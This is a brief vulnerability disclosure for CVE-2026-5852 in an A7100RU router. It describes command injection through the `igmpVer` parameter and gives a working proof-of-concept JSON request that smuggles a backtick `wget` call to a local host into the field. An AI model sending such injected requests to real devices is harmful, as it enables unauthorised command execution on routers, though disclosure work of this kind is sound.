# A7100RU Vulnerability（CVE-2026-5852）
...
In  sub_42274C function, it reads in a user-provided parameter `igmpVer` and passes its value to Uci_Set_Str function,which is defined in libcscommon.so.
...
We set `igmpVer` as **\`wget 192.168.6.1:7777/testpoc\`** , and the router will execute it,such as:
...
{"topicurl":"setIptvCfg","igmpVer":"`wget 192.168.6.1:7777/testpoc`"}
```
